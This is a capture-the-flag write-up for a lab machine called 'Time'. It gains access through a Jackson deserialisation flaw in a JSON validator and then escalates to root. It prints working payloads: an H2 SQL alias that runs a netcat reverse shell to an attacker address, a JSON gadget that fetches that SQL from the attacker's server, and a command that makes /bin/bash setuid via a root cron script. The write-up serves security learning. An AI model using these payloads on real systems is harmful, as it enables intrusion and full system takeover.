# Time

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.102
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 10:05 EDT
Warning: 10.129.85.102 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.85.102
Host is up (0.039s latency).
Not shown: 45364 closed tcp ports (conn-refused), 20169 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### JSON Beautifier

Port 80 was running a JSON Beautifier:

<figure><img src="../../../.gitbook/assets/image (683).png" alt=""><figcaption></figcaption></figure>

This would accept JSON inputs, but I had no idea what kind of engine this was using. There were 2 modes to this: Beautify and Validate, of which the latter was in Beta. I tried sending some random input and managed to trigger an error:

<figure><img src="../../../.gitbook/assets/image (2506).png" alt=""><figcaption></figcaption></figure>

We can view the rest of this error either in Burp or by examining the page source.

{% code overflow="wrap" %}
```
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```
{% endcode %}

So this was using a software called Jackson to validate JSON input. Googling for exploits led me to some deserialisation related exploits where we could achieve RCE. Here's the PoC I used:

{% embed url="https://github.com/jas502n/CVE-2019-12384" %}

We first need to create a reverse shell in SQL interestingly:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 4444 >/tmp/f')
```

Afterwards, we need to send this input to the application to be parsed:

<pre class="language-json"><code class="lang-json">[
<strong>"ch.qos.logback.core.db.DriverManagerConnectionSource",
</strong>{
"url": "jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http:\/\/10.10.14.13\/exploit.sql'"
}
]
</code></pre>

When we send this, it would download the file and give us a reverse shell.

<figure><img src="../../../.gitbook/assets/image (1791).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### GetText

I ran a LinPEAS scan for enumeration. Within the output, this caught my eye:

```
[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path      
/usr/bin/gettext.sh                                                                          
You own the script: /usr/bin/timer_backup.sh
/usr/bin/rescan-scsi-bus.sh
```

It seems that we own a script or something. Since this is within the system's PATH variable, we can just edit it. Here's the content of the script:

```bash
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
```

This looks like something that the `root` user would have on a cronjob. As such, we can just append `chmod u+s /bin/bash` to the script.&#x20;

```bash
pericles@time:/usr/bin$ echo 'chmod u+s /bin/bash' >> timer_backup.sh
```

<figure><img src="../../../.gitbook/assets/image (2674).png" alt=""><figcaption></figcaption></figure>

Easy root!
